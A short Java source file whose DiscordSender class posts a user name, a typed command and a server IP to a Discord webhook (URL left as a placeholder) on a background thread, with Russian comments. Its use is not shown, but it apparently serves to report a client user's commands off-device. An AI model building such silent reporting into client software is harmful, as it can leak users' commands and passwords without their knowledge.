package com.escape.client;

import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URI;
import java.net.URL;
import java.nio.charset.StandardCharsets;

public class DiscordSender {
    // Сылка на вебхук ниже
    private static final String WEBHOOK_URL = "Вебхук Сюда";

    public static void send(String user, String text, String serverIp) {
        new Thread(() -> {
            try {
                String safeUser = user.replace("\\", "\\\\").replace("\"", "\\\"");
                String safeText = text.replace("\\", "\\\\").replace("\"", "\\\"");
                String safeServerIp = serverIp.replace("\\", "\\\\").replace("\"", "\\\"");

                URL url = URI.create(WEBHOOK_URL).toURL();
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "application/json");
                conn.setDoOutput(true);

                String description = "Команда: `" + safeText + "`\\nСервер: **" + safeServerIp + "**";

                String json = "{"
                        + "\"embeds\": [{"
                        + "\"title\": \"" + safeUser + "\","
                        + "\"description\": \"" + description + "\","
                        + "\"color\": 15105570"
                        + "}]"
                        + "}";

                try (OutputStream os = conn.getOutputStream()) {
                    os.write(json.getBytes(StandardCharsets.UTF_8));
                }

                int code = conn.getResponseCode();
                if (code >= 400) {
                    System.err.println("[Discord Error] Код: " + code);
                }

                conn.disconnect();
            } catch (Exception e) {
                e.printStackTrace();
            }
        }).start();
    }
}
